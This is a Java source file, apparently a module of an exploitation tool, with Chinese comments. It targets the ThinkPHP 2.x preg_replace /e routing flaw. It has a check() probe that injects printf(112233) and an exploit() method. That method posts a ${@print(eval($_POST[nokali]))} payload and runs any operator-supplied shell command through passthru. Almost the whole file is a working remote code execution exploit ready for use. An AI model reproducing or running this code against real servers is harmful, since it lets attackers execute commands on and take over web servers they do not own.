package Module;

import Framework.HTTPinterface;

/**
 * ThinkPHP 2.x 任意代码执行漏洞
 *
 * ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：
 * $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
 * 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。
 * ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
 */

public class TP2_RCE {
    public static Boolean check(String url){
        try {
            String result = HTTPinterface.GET(url +
                    "/index.php?s=/index/index/name/$%7B@printf(112233)%7D");
            if(result.contains("112233")){
                return true;
            }else{
                return false;
            }
        }catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url,String cmd){
        try{
            //cmd=cmd.replace(" ","+");    //替换空格为加号，防止在拼接payload时出错，此处为POST，无需使用
            String result=HTTPinterface.POST(url+"/index.php?s=a/b/c/${@print(eval($_POST[nokali]))}","nokali=passthru(\""+cmd+"\");");
            //通过构造出eval函数，提交POST数据实现命令执行，可修改默认密钥（正常无需修改）
            //使用passthru函数执行系统命令，可修改为其他函数
            System.out.println(result);    //控制台调试
            result = result.substring(0, result.indexOf("<!DOCTYPE"));    //去除多余输出，如果需要读取完整回显，注释该行即可
            return result;
        }catch (Exception e){
            return "[-]访问出错";
        }
    }
}
